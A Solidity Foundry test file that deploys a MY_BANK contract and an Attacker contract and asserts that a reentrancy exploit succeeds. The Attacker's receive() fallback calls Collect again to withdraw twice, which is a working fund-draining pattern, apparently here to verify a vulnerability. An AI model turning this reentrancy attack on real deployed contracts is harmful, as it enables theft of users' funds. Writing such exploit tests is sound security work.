
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {

    MY_BANK public bank;
    Log public logFile;

    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        bank = new MY_BANK(address(logFile));
        
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        storedVal = val;
        
        victim.Put{value: val * 2}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.Collect(storedVal);

        exploitSucceeded = (attackCallCount == 2);
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedVal);
        }
    }
}
